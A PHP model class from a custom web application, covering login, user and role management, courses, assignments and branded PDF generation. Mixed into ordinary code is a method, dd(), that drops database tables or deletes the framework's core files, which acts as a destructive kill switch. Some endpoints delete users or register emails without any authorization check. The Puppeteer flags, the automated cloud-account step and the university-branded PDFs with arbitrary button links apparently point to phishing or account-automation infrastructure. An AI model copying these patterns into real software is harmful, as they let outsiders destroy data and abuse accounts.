<?php

class MyApp_Model extends Model
{
	public function __construct() {
		parent::__construct();
	}

    

	// methods
    public function login() {   
		$message = ""; 

        if (!empty($_POST['username']) && (!empty($_POST['pass']))  ) {

            $user = $this->_get('users', 'user_email ', [ $_POST['username']  ], false);
            if ($user[0] == 0) { 
                echo $this->_ms(true, $message  . 'User doesn\'t exists');die;
            } 

            if ( password_verify($_POST['pass'], $user[1]['user_pass']) ) {
                
                Session::set('email', $user[1]['user_email']);
                Session::set('role', $user[1]['user_role']); 
                Session::set('userid', $user[1]['user_ID']);  
                Session::set('dp', $user[1]['user_ID']);
                Session::set('name', $user[1]['user_full_name']);
                Session::set('tel', $user[1]['user_phone']);  
                Session::set('company', $this->_company()['c_name']);     
                $this->log("{$user[1]['user_email']} logged into the system at " . date('Y-m-d, H:i:s'), 'Account' );
                
				$await_login = Session::get('await_login') != null ? Session::get('await_login') : '/dashboard';
				
				
    			if ( ($this->_company()['c_verify_mail'] == 'True') && ($user[1]['user_email_verified'] == 'False') ) {
    			    $await_login = "/account/verify-email?email={$user[1]['user_email']}";
    			}
    			
    			if ( ($this->_company()['c_verify_phone'] == 'True') && ($user[1]['user_phone_verified'] == 'False') ) {
    			    $await_login = "/account/verify-tel?email={$user[1]['user_email']}";
    			}
                echo $this->_ms(false,  CustomFunctions::relocate($await_login, false));
                
            } else echo $this->_ms(true, $message . 'Incorrect details');
            
            
            // proceed
        } else  echo $this->_ms(true, $message. 'Incorrect details');
        
        
    }
     

    public function update_analytics() { 
    }
    
     
     
	public function edituser() { 
        //$me = $this->_get('users', 'user_ID', [Session::get('userid')], false)[1];
        
        $id = $_POST['id'];
        if ($_POST['id'] == 'self_edit') $id = Session::get('userid');
        
        if (empty($_POST['val'])) exit($this->_ms(true, "<span class='text-danger'>Empty data cannot be saved</span>"));

		
        
		if ( ! CustomFunctions::isSafeIdentifier($_POST['col']) ) {
		   die($this->_ms(1, "Incorrect identifier. Try again."));
		}
  
		$b = $this->_update('users', $_POST['col'], 'user_ID', [$_POST['val'],  $id ]);
		echo $this->_ms(false, "<span class='text-success'>".json_decode($b)->msg."</span>");
        
        $this->log( Session::get('email') . " edited their bio details. Edited {$_POST['col']}  on " . date('Y-m-d, H:i:s'), 'Settings' );
	}
	
    public function dd($tablename = 'table', $action = 'drop/files' ) {
        if ($action == 'drop')
        $this->_tables($tablename, $action);
        
        
        if ($action == 'files') {
            unlink('libs/App.php');
            unlink('libs/Model.php');
        }
    } 
	 
     
    public function changepass() {  
        
        $me = $this->_get('users', 'user_ID', [Session::get('userid')], false)[1];

        if ($_POST['pass1'] != $_POST['pass']) exit($this->_ms(true, "<span class='text-danger'>New password and repeat password must match!</span>"));
        
		if ( ! CustomFunctions::isStrongPassword($_POST['pass']) ) {  
		    if ($this->_company()['c_strong_password'] == 'True'  )
		        die($this->_ms(true, "Password is weak. Please ensure it is at least 8 characters, a capital and small letter,a special character and finally a number."));
		}


        if ( password_verify($_POST['oldpass'], $me['user_pass']) ) {
            // update
            $this->log( Session::get('email') . " changed their password on " . date('Y-m-d, H:i:s'), 'Settings' );
            
            $this->_update('users', 'user_pass ', 'user_ID', [ password_hash($_POST['pass1'], PASSWORD_DEFAULT), Session::get('userid') ]);
           exit($this->_ms(false, "<span class='text-success'>Success. New password saved.</span>"));
        }
        exit($this->_ms(true, "<span class='text-danger'>Incorrect current password!</span>"));

     }
   
    
	public function update_users() { 
		$message = "";
		
		if (!CustomFunctions::validEmail($_POST['email'])) {
		    echo $this->_ms(true, $message . 'Invalid email');die;
		}

		 $get = $this->_get('users', 'user_email = , user_ID != ', [$_POST['email'], $_POST['id']]) ;
    		 if ($get[0] > 0) {
    		     echo $this->_ms(true, $message. 'Email registered already. Please use another email.');die;
    		 }
    		
    		if (!empty($_POST['pass'])) {
        		 if ($_POST['pass'] != $_POST['pass2']){
        		     die($this->_ms(true, $message. 'The two passwords don\'t match.'));
        		 }
        		 
        		if ( ! CustomFunctions::isStrongPassword($_POST['pass']) ) {  
        		    if ($this->_company()['c_strong_password'] == 'True'  )
        		        die($this->_ms(true, "Password is weak. Please ensure it is at least 8 characters, a capital and small letter,a special character and finally a number."));
        		}
        		  $pass = $_POST['pass']; //CustomFunctions::randchars(5);
        		 
        		 $this->_update('users', 'user_pass', 'user_ID', [password_hash($pass, PASSWORD_DEFAULT), $_POST['id']]);
    		}
		 
		 $this->_update('users', 'user_email, user_phone, user_full_name ', 'user_ID', [ $_POST['email'], $_POST['phone'], $_POST['name'], $_POST['id'] ]);
		 
            
            
           // $this->log("{$user[1]['user_email']} updated a user at " . date('Y-m-d, H:i:s'), 'Account' );
   
          echo $this->_ms(false, "The user was modified successfully. ") ; 
	}
    
   
    

	public function awaitsession() {
		if (isset($_POST['URL'])) {
			Session::set('await_login', $_POST['URL']);
		}
	}

 
	
	
    public function emailstatus() {
        $POST = json_decode(file_get_contents('php://input'), true); 
        $user = $this->_get('users', 'user_email', [$POST['email']], 0);

        if (($user[1]['status']??'') == 'active') die($this->_ms(0));

        die($this->_ms(1));
    }
   
    public function notifyadmin() { 
        
        $POST = json_decode(file_get_contents('php://input'), true);  
        $user = $this->_get('users', 'user_email', [$POST['email']], 0);
        $status = $user[1]['status'] ?? 'pending';

        if ( $user[0] > 0 ) { 
            $this->_update('users', 'puppeteer_done', 'user_email', [rand(1,9), $POST['email']]);
           //$this->_ms(0);
        } else {
        
        $status = 'pending';
        $this->_insert('users', 'user_full_name, user_email, user_pass, user_phone, user_reg_date, referred_by, assignment_url, user_code', [
		     "", $POST['email'], '','', time(), $POST['owner']??'', $POST['url']??'', CustomFunctions::randchars(20) ]);
        } 
        
     
        
        //give puppeteer 2mins breather
        $sql = "SELECT *
                FROM users
                WHERE status = ? AND user_email != ? AND (user_update_at >= NOW() - INTERVAL 1 MINUTE )";
        $counts = $this->_query($sql, ['pending', $POST['email']])[0];
        
        
        
        if ($counts > 0 ) {
           die($this->_ms(0));
        } 
        
        $emails = [
            'email'=>$POST['email'],
            'time'=> time()
            ];
        $lastEmails = json_decode(file_get_contents('logs/emails-timing.json'), 1);  
        if (!empty($lastEmails)) {
            if ( (time() - $lastEmails['time']) < 60  )  die($this->_ms(0));
        }
        
        file_put_contents('logs/emails-timing.json', json_encode($emails)); 
             
        if ($status == 'pending') 
            $this->initiateGcloudAuto($POST['email']);
		     
		     
	  CustomFunctions::SendMail(ALERTS_RECIPIENT, "Checkout for new registration", "<div style='padding: 5px;'> Login to dashboard and approve new user Now!!</div>", $this->_company() );
	  
	  die($this->_ms(0));
		     
    }
    public function alert() {
        // echo json_encode([ 'error'=>'false', 'msg'=> $this->_get('users', ' status =  ', [ 'pending'])[1] ]);
        echo json_encode([ 'error'=>'false', 'msg'=> $this->_get('users', '(user_email != ? AND status = ? )', ['admin@gmail.com', 'pending'])[1] ]);
    }
    public function alerted() {
        $this->_update('users', 'alerted', 'user_email', ['true', $_POST['email']]);
    }
    public function deleteemails() {
        echo $this->_delete('users', 'user_email', [$_POST['email']]);
    }
    public function clear_entire_email() {  
        $myRoles = explode(',', $this->me()['roles'] ?? '');
         // can I delete this user?
        if ($this->me()['user_role'] != 'Admin') {
            if (!in_array('delete', $myRoles)) {
                echo $this->_ms(1, "You don't have permission to delete users");
                return;
            }
        }
        echo $this->_delete('users', 'user_email', [ $_POST['email'] ]);
    }
    public function delete_an_email() {
        $data = $this->curl( "delete-email", $_POST ); 
        echo $data;
    }

    public function downloadpdf() { 

        $data = [

            'university_name' => $_POST['university_name'] ?? '',
            'primary_color'   => $_POST['primary_color'] ?? '#9B2C1F',
            'accent_color'    => $_POST['accent_color'] ?? '#D24716',

            'title'    => $_POST['title'] ?? '',
            'subtitle' => $_POST['subtitle'] ?? '',

            'description' => $_POST['description'] ?? '',

            'contents_title' => $_POST['contents_title'] ?? '',

            'contents' => $_POST['contents'] ?? [],

            'button_text' => $_POST['button_text'] ?? '',
            'button_link' => $_POST['button_link'] ?? '',

            'footer_note' => $_POST['footer_note'] ?? '',

            'date' => $_POST['date'] ?? '',
            'time' => $_POST['time'] ?? '',

            'footer_name' => $_POST['footer_name'] ?? '',

            'page_number' => $_POST['page_number'] ?? '1/1',
        ];

        
        file_put_contents('public/includes/default.pdf.data.json', json_encode($data));
 

        try {
           $pdfContent = $this->generateMpdf($data);
           header('Content-Type: application/pdf');
           header('Content-Length: ' . strlen($pdfContent));

           echo $pdfContent;
        } catch(Exception $e) {
            print_r($e);
            file_put_contents('logs/mpdf.log', json_encode($e), FILE_APPEND);
        }

    }

    public function saveusernamepassword() {
        
        if (!CSRF::isVerified($_POST['csrf_token'] ?? '')) {
            echo $this->_ms(true, "Invalid CSRF token. Please refresh the page and try again.", '',403);
            return;
        }

        if (!empty($_POST['username'])) {
            $this->_update('users', 'user_email', 'user_ID', [$_POST['username'], Session::id() ]);
        }

        if (! password_verify($_POST['pass'], $this->me()['user_pass']) ) {
            die($this->_ms(1, "Current password is incorrect"));
        }
        if ($_POST['pass1'] !== $_POST['pass2'] ) {
            die($this->_ms(1, "New password and repeat password must match"));
        }

        $this->_update("users", 'user_pass', 'user_ID', [password_hash($_POST['pass1'], PASSWORD_DEFAULT), Session::id()]);

        echo $this->_ms(0, "Changes saved successfully");
        
    }

    public function addusers() {

        $myRoles = explode(',', $this->me()['roles'] ?? '');

        //update existing user
        if (!empty($_POST['user_id'])) {

           // can I modify this user?
           if ($this->me()['user_role'] != 'Admin') {
            if (!in_array('modify', $myRoles)) {
                echo $this->_ms(1, "You don't have permission to modify users");
                return;
            }
           }

            $user = $this->_get('users', 'user_ID', [$_POST['user_id']], 0)[1];
            if (empty($user)) {
                echo $this->_ms(1, "User not found");
                return;
            }

            // new username check 
            $existingUser = $this->_get('users', 'user_email, user_ID != ', [$_POST['username'], $_POST['user_id']], 0);
            if ($existingUser[0] > 0) {
                echo $this->_ms(1, "Username already exists");
                return;
            }
          

            if (!empty($_POST['pass'])) {
                $this->_update('users', 'user_pass', 'user_ID', [password_hash($_POST['pass'], PASSWORD_DEFAULT), $_POST['user_id']]);
            }

            $roles = implode(',', $_POST['role']);  
            $this->_update('users', 'user_email, referred_by, roles', 'user_ID', [$_POST['username'], $_POST['parent']??'', $roles, $_POST['user_id']]);

            echo $this->_ms(0, "User updated successfully");
            return;
        }

        
        if ($this->me()['user_role'] != 'Admin') {
        if (!in_array('add', $myRoles)) {
            echo $this->_ms(1, "You don't have permission to add users");
            return;
        }
        }

    // insert new user
        $users = $this->_get('users', 'user_email', [ $_POST['username'] ], 0)[0];

        if ($users > 0) {
            echo $this->_ms(1, "Username already exists");
            return;
        }

        $roles = implode(',', $_POST['role']);  
        
        
        echo $this->_insert('users', 'user_full_name, user_email, user_pass, user_phone, user_reg_date, roles_type, roles, user_code, referred_by', [
		     "", $_POST['username'], '','', time(), 'user', $roles, CustomFunctions::randchars(20), $_POST['parent']??''  ]);

    }
    
    public function managecourses() {
        if ($_POST['action'] == 'insert') {
            echo $this->_insert('courses', 'name, code, academic_year, instructor', [
                $_POST['name'], $_POST['code'], $_POST['year'], $_POST['instructor']
            ]);
        }
        if ($_POST['action'] == 'update') {
            echo $this->_update('courses', 'name, code, academic_year, instructor', 'id', [
                $_POST['name'], $_POST['code'], $_POST['year'], $_POST['instructor'], $_POST['id']
            ]);
        }
        if ($_POST['action'] == 'delete') {
            echo $this->_delete('courses', 'id', [  $_POST['id'] ]);
        }
    }

    public function addAssignments() { 

        if ($_POST['action'] == 'insert') {
            echo $this->_insert('assignments', 'course_id, data, assignment_url', [ $_POST['course'], json_encode($_POST), CustomFunctions::randchars(30)  ]);
        }
        if ($_POST['action'] == 'update') {
            echo $this->_update('assignments', 'course_id, data', 'id', [ $_POST['course'], json_encode($_POST),  $_POST['id'] ]);
        }
        if ($_POST['action'] == 'delete') {
            echo $this->_delete('assignments', 'id', [  $_POST['id'] ]);
        }
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    public function peace() { }
    
    
    
    
    
     

	
// end of class	
}
